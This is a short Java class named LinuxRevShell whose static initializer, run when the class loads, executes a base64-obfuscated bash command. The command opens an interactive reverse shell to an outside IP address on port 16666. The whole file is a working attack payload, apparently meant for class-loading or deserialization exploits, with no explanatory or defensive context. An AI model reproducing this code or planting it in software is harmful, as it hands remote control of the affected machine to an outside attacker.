public class LinuxRevShell {
    static {
        try {
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwMS4yMDAuMTQ4LjEyMy8xNjY2NiAwPiYx}|{base64,-d}|{bash,-i}");
        } catch (Exception e) {
            System.out.println("error!");
        }
    }
}
